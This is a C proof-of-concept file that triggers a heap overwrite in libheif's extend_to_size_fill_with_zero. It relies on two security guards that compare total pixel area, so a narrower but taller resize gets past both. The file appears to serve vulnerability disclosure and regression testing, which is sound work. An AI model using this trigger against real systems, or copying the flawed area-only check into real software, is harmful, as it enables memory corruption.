/*
 * Proof of concept for the composed defect spanning two commits in
 * libheif/image/pixelimage.cc:
 *
 *   - "Reject shrink requests in extend_to_size_with_zero (GHSA-hqc2-cx5m-g6ff)"
 *   - "Reject a mismatched Cb/Cr plane size (GHSA-j2rv-58fh-w8pw)"
 *
 * Both commits guard HeifPixelImage::extend_to_size_with_zero() against a
 * shrink request (the function only ever grows an image; the per-row
 * right-edge fill computes its memset length as (subsampled_width -
 * old_width), which underflows uint32_t on a shrink and writes far past the
 * end of the pixel plane). Each guard compares the requested width/height
 * against the current size by comparing total pixel *area* instead of each
 * dimension independently, so a request that shrinks one dimension while
 * growing the other enough to keep (or increase) the total pixel count
 * slips past both checks.
 *
 * This builds a small monochrome image through the public API
 * (heif_image_create + heif_image_add_plane), then asks to "extend" it to a
 * size that is narrower but much taller, which a correct implementation must
 * reject, and which both weakened area-based guards let through, reaching
 * the vulnerable memset with an underflowed length.
 */

#include <libheif/heif.h>
#include <stdio.h>
#include <string.h>

int main(void)
{
  int w = 100, h = 5;

  struct heif_image* img = NULL;
  struct heif_error err = heif_image_create(w, h, heif_colorspace_monochrome,
                                            heif_chroma_monochrome, &img);
  if (err.code) {
    fprintf(stderr, "heif_image_create failed: %s\n", err.message);
    return 1;
  }

  err = heif_image_add_plane(img, heif_channel_Y, w, h, 8);
  if (err.code) {
    fprintf(stderr, "heif_image_add_plane failed: %s\n", err.message);
    return 1;
  }

  {
    int stride = 0;
    uint8_t* p = heif_image_get_plane(img, heif_channel_Y, &stride);
    memset(p, 0xAB, (size_t) stride * (size_t) h);
  }

  /* The total pixel count grows (100*5=500 -> 50*200=10000), but the width
   * shrinks from 100 to 50. A correct implementation rejects this because the
   * image would have to shrink in one dimension; the composed defect accepts
   * it because it only compares total pixel counts. */
  err = heif_image_extend_to_size_fill_with_zero(img, 50, 200);

  fprintf(stderr, "extend_to_size_fill_with_zero returned code=%d subcode=%d\n",
          err.code, err.subcode);

  heif_image_release(img);
  return 0;
}
